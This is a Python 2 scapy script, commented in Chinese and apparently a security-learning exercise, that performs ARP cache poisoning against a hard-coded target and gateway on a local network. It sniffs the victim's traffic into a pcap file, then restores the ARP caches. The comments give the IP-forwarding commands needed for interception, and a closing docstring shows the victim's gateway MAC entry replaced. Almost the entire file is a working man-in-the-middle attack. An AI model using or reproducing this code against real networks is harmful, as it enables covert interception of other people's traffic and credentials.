# coding=utf-8
import threading

from scapy.all import *

# 当前网卡地址
interface = "en2"
# 目标IP
target_ip = "192.168.1.104"
# 网关IP
gateway_ip = "192.168.1.1"
packet_count = 900000
poisoning = True


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # 使用不同的方式进行send调用
    print "[*] Restoring target..."
    # 发送的定制的ARP数据包到网络广播地址上,对网关和目标机器的ARP缓存进行还原
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)


def get_mac(ip_address):
    # 调用srp函数(发送和接受数据包)发送ARP请求到指定的IP地址,然后从返回的数据中获得目标IP对应的MAC地址
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, retry=10)

    # 从响应中得到MAC地址
    for s, r in responses:
        return r[Ether].src

    return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    """
    对网关和目标进行投毒攻击后,我们就能嗅探到目标机器进出的流量了
    :param gateway_ip:
    :param gateway_mac:
    :param target_ip:
    :param target_mac:
    :return:
    """
    global poisoning

    # 构建欺骗目标IP的ARP请求
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    # 构建欺骗目标网关的ARP请求
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print "[*] Beginning the ARP poison. [CTRL-C to stop]"

    # 使用循环不断发送ARP请求
    while poisoning:
        send(poison_target)
        send(poison_gateway)

        time.sleep(2)

    print "[*] ARP poison attack finished."

    return


def driver():
    # 设置嗅探的网卡
    conf.iface = interface

    # 关闭输出
    conf.verb = 0

    print "[*] Setting up %s" % interface

    gateway_mac = get_mac(gateway_ip)

    if gateway_mac is None:
        print "[!!!] Failed to get gateway MAC. Exiting."
        sys.exit(0)
    else:
        print "[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)

    target_mac = get_mac(target_ip)

    if target_mac is None:
        print "[!!!] Failed to get target MAC. Exiting."
        sys.exit(0)
    else:
        print "[*] Target %s is at %s" % (target_ip, target_mac)

    # 启动ARP投毒进程
    poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.start()

    try:
        print "[*] Starting sniffer for %d packets" % packet_count

        bpf_filter = "ip host %s" % target_ip
        packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

    except KeyboardInterrupt:
        pass

    finally:
        # 将捕获到的数据包输出到文件
        print "[*] Writing packets to arper.pcap"
        wrpcap('arper.pcap', packets)

        poisoning = False

        # 等待线程退出
        time.sleep(2)

        # 还原网络配置
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        sys.exit(0)


# 在Linux中 需要在执行脚本的机器上 echo 1 > /proc/sys/net/ipv4/ip_forward
# 在Mac中 sudo sysctl -w net.inet.ip.forwarding=1

"""
结果:目标机器上
➜  ~ arp -a
? (192.168.1.102) at 40:a5:ef:0c:e0:bf [ether] on wlan0
? (192.168.1.104) at 70:77:81:15:7c:36 [ether] on wlan0
? (192.168.1.1) at 40:a5:ef:0c:e0:bf [ether] on wlan0 ->网关MAC地址已经被替换
"""
driver()
